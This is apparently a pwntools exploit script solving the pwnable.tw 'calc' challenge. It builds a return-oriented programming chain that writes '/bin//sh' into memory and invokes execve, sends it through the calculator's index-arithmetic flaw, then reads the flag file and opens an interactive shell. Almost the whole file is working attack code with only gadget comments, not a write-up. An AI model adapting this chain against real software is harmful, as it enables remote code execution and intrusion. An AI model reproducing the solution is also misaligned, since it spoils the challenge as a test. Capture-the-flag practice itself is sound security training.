#! /usr/bin/python
from pwn import *

#r = process('./calc')
r = remote('chall.pwnable.tw',10100) 
#context.log_level='debug'
#gdb.attach(r,'b* 0x8049411')
#gdb.attach(r,'b* 0x08049433')

payload = []
payload.append('134520595') # 0x08049f13 : xor ecx, ecx ; pop ebx ; mov eax, ecx ; pop esi ; pop edi ; pop ebp ; ret
payload.append('135180544') # bss : 0x80eb100
payload.append('1') # 1
payload.append('1') # 1
payload.append('1') # 1

payload.append('134676906') # 0x080701aa : pop edx ; ret
payload.append('1852400175') # 0x6e69622f "/bin"

payload.append('134564067') # 0x080548e3 : mov dword ptr [ebx], edx ; add esp, 0x18 ; pop ebx ; ret
payload.append('1') # 1
payload.append('1') # 1
payload.append('1') # 1
payload.append('1') # 1
payload.append('1') # 1
payload.append('1') # 1
payload.append('135180548') # bss+4 : 0x80eb104

payload.append('134676906') # 0x080701aa : pop edx ; ret
payload.append('1752379183') # 0x68732f2f "//sh"

payload.append('134564067') # 0x080548e3 : mov dword ptr [ebx], edx ; add esp, 0x18 ; pop ebx ; ret
payload.append('1') # 1
payload.append('1') # 1
payload.append('1') # 1
payload.append('1') # 1
payload.append('1') # 1
payload.append('1') # 1
payload.append('135180544') # bss : 0x80eb100

payload.append('134791917') # 0x0808c2ed : xor edx, edx ; pop ebx ; div esi ; pop esi ; pop edi ; pop ebp ; ret
payload.append('135180544') # bss : 0x80eb100
payload.append('1') # 1
payload.append('1') # 1
payload.append('1') # 1

payload.append('134595403') # 0x0805c34b : pop eax ; ret
payload.append('11') # 0xb
payload.append('134519329') # 0x08049a21 : int 0x80

'''
# ecx 0, ebx bss
0x08049f13 : xor ecx, ecx ; pop ebx ; mov eax, ecx ; pop esi ; pop edi ; pop ebp ; ret
bss : 0x80eb100
1
1
1

0x080701aa : pop edx ; ret
0x6e69622f "/bin"

0x080548e3 : mov dword ptr [ebx], edx ; add esp, 0x18 ; pop ebx ; ret
1
1
1
1
1
1
bss+4 : 0x80eb104

0x080701aa : pop edx ; ret
0x68732f2f "//sh"

0x080548e3 : mov dword ptr [ebx], edx ; add esp, 0x18 ; pop ebx ; ret
1
1
1
1
1
1
bss : 0x80eb100

# ecx 0, edx 0, ebx "/bin//sh" 
0x0808c2ed : xor edx, edx ; pop ebx ; div esi ; pop esi ; pop edi ; pop ebp ; ret
bss : 0x80eb100
1
1
1

0x0805c34b : pop eax ; ret
0xb
0x08049a21 : int 0x80

'''


r.recvuntil("=== Welcome to SECPROG calculator ===")
for i in range(len(payload)):
	r.sendline("+"+str(360+len(payload)-i-1)+"+"+payload[len(payload)-i-1])
	r.recvline()

r.send('\n')
r.sendline('cat /home/calc/flag')
r.interactive()

